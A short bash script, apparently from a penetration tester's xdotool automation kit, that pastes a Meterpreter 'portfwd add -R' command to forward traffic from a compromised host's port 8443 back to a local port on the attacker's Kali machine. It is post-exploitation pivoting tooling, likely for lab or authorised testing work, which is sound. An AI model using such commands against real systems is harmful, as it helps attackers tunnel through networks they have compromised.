#!/bin/bash

: '
meterpreter: forward all trafic from remote port 8443 to local port 1234
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

paste_command "portfwd add -R -l 8443 -p 1234 -L ${KALI_IP}"